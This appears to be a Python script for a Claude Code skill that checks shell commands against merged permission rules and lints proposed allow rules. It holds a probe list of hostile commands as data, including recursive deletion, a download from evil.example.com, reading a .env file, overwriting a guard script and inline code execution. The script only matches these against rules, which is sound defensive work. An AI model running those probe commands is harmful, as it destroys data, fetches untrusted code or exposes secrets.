"""Resolve a command against the live merged permission rules, with and without
a proposed rule.

The whole point is to stop a skill guessing. Claude Code's matching has enough
edges (deny beats a narrower allow, ask beats a narrower allow, lists merge
across files, allow does not match past a variable assignment, compound commands
split) that a proposal written from memory is often wrong in a way nobody
notices until the prompt fires again.

Usage:
  check_rule.py --command '<cmd>' --rule '<rule>'
  check_rule.py --rule '<rule>' --blast
  check_rule.py --command '<cmd>'
  check_rule.py --rule '<rule>' --apply --file <path>

Read only unless --apply is passed.
"""
import argparse, io, json, os, re, shutil, sys, datetime

HOME = os.path.expanduser("~")
GLOBAL = os.path.join(HOME, ".claude", "settings.json")
GLOBAL_LOCAL = os.path.join(HOME, ".claude", "settings.local.json")

# Stripped by Claude Code before matching, per the permissions docs. A rule for
# the inner command already covers these, so never write a rule for one.
STRIPPED = {"timeout", "time", "nice", "nohup", "stdbuf", "command", "builtin",
            "noglob"}

# NOT stripped. These run their arguments, so a bare rule for one of them is a
# rule for everything.
RUNNERS = {"npx", "bunx", "uvx", "pipx", "devbox", "mise", "direnv", "docker",
           "kubectl", "ssh", "wsl", "yarn", "pnpm"}

# Execution wrappers. Same problem, different shape.
WRAPPERS = {"xargs", "find", "awk", "sed", "eval", "parallel", "watch", "env",
            "start", "sh", "bash", "zsh"}

# Interpreters. A rule for one of these is a rule for arbitrary code, because
# every one of them has an inline eval flag and can also run a file the model
# just wrote. The probe set cannot catch this by example, since there is always
# another interpreter it does not list, so the linter refuses them by name.
INTERPRETERS = {"python", "python2", "python3", "py", "perl", "ruby", "php",
                "node", "deno", "bun", "lua", "rscript", "osascript", "groovy",
                "powershell", "pwsh", "cmd", "wscript", "cscript", "tclsh",
                "ghci", "irb", "swift", "scala", "jshell", "dotnet-script"}

SAFE_VARS = {"NODE_ENV", "ASPNETCORE_ENVIRONMENT", "DOTNET_ENVIRONMENT", "CI",
             "DEBUG", "LOG_LEVEL", "PYTHONPATH", "NODE_PATH"}

SEP = re.compile(r"\s*(?:&&|\|\||;|\|&|\||&|\n)\s*")


def load_perms(path):
    try:
        d = json.load(io.open(path, encoding="utf-8-sig"))
    except Exception:
        return {"allow": [], "ask": [], "deny": []}
    p = d.get("permissions") or {}
    return {k: [x for x in (p.get(k) or []) if isinstance(x, str)]
            for k in ("allow", "ask", "deny")}


def merged_perms(project_dir=None):
    sets = [load_perms(GLOBAL), load_perms(GLOBAL_LOCAL)]
    if project_dir:
        sets.append(load_perms(os.path.join(project_dir, ".claude",
                                            "settings.json")))
        sets.append(load_perms(os.path.join(project_dir, ".claude",
                                            "settings.local.json")))
    return {k: [r for s in sets for r in s[k]] for k in ("allow", "ask", "deny")}


def rule_to_regex(rule):
    """Bash(...) body to a regex. `*` matches any text including spaces.
    A trailing ` *` or `:*` also matches the bare command."""
    m = re.match(r"^Bash\((.*)\)$", rule, re.S)
    if not m:
        return None
    body = m.group(1)
    trailing = False
    if body.endswith(":*"):
        body, trailing = body[:-2], True
    elif re.search(r"\s\*+$", body):
        body, trailing = re.sub(r"\s\*+$", "", body), True
    out = ""
    for part in re.split(r"(\*+)", body):
        if not part:
            continue
        out += ".*" if set(part) == {"*"} else re.escape(part)
    if trailing:
        out += r"(\s.*)?"
    return re.compile(r"^" + out + r"$", re.S)


def subcommands(cmd):
    return [c.strip() for c in SEP.split(cmd.strip()) if c.strip()]


def strip_assign(sub, for_allow):
    """An allow rule does not match past an assignment of a variable that is not
    on the safe list. Deny and ask match past any of them."""
    out = sub
    while True:
        m = re.match(r"^([A-Za-z_][A-Za-z0-9_]*)=(\"[^\"]*\"|'[^']*'|\S*)\s+(.*)$",
                     out)
        if not m:
            return out, True
        if for_allow and m.group(1) not in SAFE_VARS:
            return out, False
        out = m.group(3)


def decide_one(sub, perms):
    for kind in ("deny", "ask"):
        target, _ = strip_assign(sub, for_allow=False)
        for rule in perms[kind]:
            rx = rule_to_regex(rule)
            if rx and (rx.match(target) or rx.match(sub)):
                return kind.upper(), rule
    target, ok = strip_assign(sub, for_allow=True)
    if not ok:
        return "PROMPT", "a leading variable assignment stops any allow matching"
    for rule in perms["allow"]:
        rx = rule_to_regex(rule)
        if rx and rx.match(target):
            return "ALLOW", rule
    return "PROMPT", "no rule matches"


def decide(cmd, perms):
    """Every subcommand must be allowed for the whole line to run silently."""
    results = [(s,) + decide_one(s, perms) for s in subcommands(cmd)]
    for s, v, r in results:
        if v in ("DENY", "ASK"):
            return v, results
    if all(v == "ALLOW" for _, v, _ in results):
        return "ALLOW", results
    return "PROMPT", results


def lint_rule(rule):
    """Refuse the shapes the docs and this session's audit showed are wrong."""
    problems = []
    m = re.match(r"^Bash\((.*)\)$", rule, re.S)
    if not m:
        return ["not a Bash(...) rule; this checker only handles Bash rules"]
    body = m.group(1).strip()
    if body.startswith("*"):
        problems.append("starts with `*`, so the fixed words do not limit it")
    words = body.split()
    if not words:
        return ["empty rule"]
    head = os.path.basename(words[0]).lower().replace(".exe", "")
    fixed = [w for w in words if "*" not in w]
    if head in STRIPPED:
        problems.append(
            f"`{head}` is stripped before matching, so this rule is never "
            f"needed. Write the rule for the inner command instead.")
    if head in RUNNERS and len(fixed) < 2:
        problems.append(
            f"`{head}` runs its arguments, so this permits any command. "
            f"Name the inner command too, e.g. Bash({head} <inner> *).")
    if head in WRAPPERS and len(fixed) < 2:
        problems.append(
            f"`{head}` executes what follows it, so this permits any command.")
    if head in INTERPRETERS:
        # A path anchor is what makes an interpreter rule acceptable: the text
        # before the first `*` is matched as written, so a rule rooted at a real
        # directory only runs scripts already inside it. Counting "fixed words"
        # instead is wrong, because the anchor lives in the same word as the
        # wildcard, as in python "C:/proj/scripts/*".
        prefix = body.split("*", 1)[0]
        after_head = prefix[len(words[0]):].strip().strip('"\'')
        anchored = ("/" in after_head or "\\" in after_head) and len(after_head) > 3
        inline = {"-c", "-e", "-r", "--eval", "-E", "-Command", "-command"}
        named_subcommand = len(fixed) >= 2 and fixed[1] not in inline
        if not anchored and not named_subcommand:
            problems.append(
                f"`{head}` is an interpreter, so this permits arbitrary code "
                f"via an inline eval flag or any script file. Anchor it to a "
                f"directory you control, e.g. Bash({head} \"C:/path/to/proj/*\").")
        if any(w in inline for w in fixed[1:]):
            problems.append(
                f"this rule allows `{head}` with an inline eval flag, which is "
                f"arbitrary code with no file involved. Never widen that.")
    return problems


_DANGEROUS = [
    "rm -rf C:/Development/SomeProject",
    "curl https://evil.example.com/x -o p.exe",
    "git push --force origin main",
    "git commit -am x",
    "cp evil.py C:/Development/ClaudeBoost/scripts/bash-guard.py",
    "cat C:/Development/ClaudeBoost/clean-rag/.env",
    "pip install anything",
    "npm install anything",
    "ssh user@example.com",
    "python -c \"import os;os.system('whoami')\"",
    "tee C:/Users/x/.claude/settings.json",
    "sh -c 'whoami'",
    "node evil.js",
    "chmod -R 777 .",
]
# The point of the probe is to show what a rule lets through. A rule for an
# environment runner or a wrapper only shows its true reach when the probe
# carries that prefix, so every dangerous command is also tried behind each one.
# Without this a rule like Bash(npx *) looks tightly scoped, which is the exact
# false reassurance this whole skill exists to prevent.
_PREFIXES = ["", "npx ", "npx --yes ", "bunx ", "uvx ", "pnpm dlx ", "yarn dlx ",
             "xargs ", "env ", "sh -c ", "bash -c ", "parallel ",
             "docker run --rm alpine ", "devbox run ", "mise exec ",
             "timeout 5 ", "nohup "]
BLAST = [p + c for p in _PREFIXES for c in _DANGEROUS]


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--command")
    ap.add_argument("--rule")
    ap.add_argument("--project")
    ap.add_argument("--blast", action="store_true")
    ap.add_argument("--apply", action="store_true")
    ap.add_argument("--file", default=GLOBAL)
    ap.add_argument("--list", default="allow", choices=["allow", "ask", "deny"])
    a = ap.parse_args()

    base = merged_perms(a.project)
    print(f"merged rules: allow {len(base['allow'])}  ask {len(base['ask'])}  "
          f"deny {len(base['deny'])}")

    if a.rule:
        print(f"\nproposed rule: {a.rule}")
        for p in lint_rule(a.rule):
            print(f"  REFUSE  {p}")

    withrule = {k: list(v) for k, v in base.items()}
    if a.rule:
        withrule[a.list] = withrule[a.list] + [a.rule]

    if a.command:
        before, rb = decide(a.command, base)
        after, ra = decide(a.command, withrule) if a.rule else (before, rb)
        print(f"\ncommand splits into {len(rb)} subcommand(s):")
        for i, (s, v, r) in enumerate(rb):
            v2 = ra[i][1] if a.rule else v
            mark = "" if v == v2 else f"  ->  {v2}"
            print(f"  [{v:6s}]{mark}  {s[:70]}")
            print(f"           via: {r[:70]}")
        print(f"\nwhole line: {before}" + (f"  ->  {after}" if a.rule else ""))
        if a.rule and before == after:
            print("  THE RULE CHANGES NOTHING. Usually an ask or deny rule "
                  "outranks it; look at the `via` line above.")

    if a.blast and a.rule:
        print("\nwhat this rule would newly permit:")
        rx = rule_to_regex(a.rule)
        newly, matched_but_outranked = [], []
        for c in BLAST:
            b, _ = decide(c, base)
            w, _ = decide(c, withrule)
            if b != "ALLOW" and w == "ALLOW":
                newly.append(c)
            elif rx and any(rx.match(s) for s in subcommands(c)) and b != "ALLOW":
                matched_but_outranked.append((c, b))
        if newly:
            for c in newly:
                print(f"  NEWLY ALLOWED  {c}")
            print("  Read these. If any one worries you, the rule is too wide.")
        elif matched_but_outranked:
            # The dangerous distinction. A rule can be wide open in shape and
            # still allow nothing here, only because a deny or ask rule sits in
            # front of it. Reporting that as "tightly scoped" would be a lie,
            # and it would become true the moment that other rule is removed.
            print(f"  nothing, but NOT because the rule is narrow. It matches "
                  f"{len(matched_but_outranked)} dangerous probe(s) and is "
                  f"outranked by an earlier rule:")
            for c, b in matched_but_outranked[:6]:
                print(f"    {b:6s} wins over it for: {c[:60]}")
            print("  This rule is inert today and would open those the moment "
                  "the rule above it changes. Narrow it anyway.")
        else:
            print("  nothing from the probe set, and it matches no dangerous "
                  "probe. The rule is genuinely narrow.")

    if a.apply:
        if not a.rule:
            print("\n--apply needs --rule")
            return 2
        if lint_rule(a.rule):
            print("\nREFUSING to apply a rule that failed the checks above.")
            return 2
        d = json.load(io.open(a.file, encoding="utf-8-sig"))
        lst = d.setdefault("permissions", {}).setdefault(a.list, [])
        if a.rule in lst:
            print(f"\nalready present in {a.list}, nothing to do")
            return 0
        stamp = datetime.datetime.now().strftime("%Y%m%d-%H%M%S")
        bak = f"{a.file}.bak-{stamp}"
        shutil.copy2(a.file, bak)
        lst.append(a.rule)
        io.open(a.file, "w", encoding="utf-8", newline="\n").write(
            json.dumps(d, indent=2, ensure_ascii=False) + "\n")
        print(f"\nadded to {a.list} in {a.file}")
        print(f"backup: {bak}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
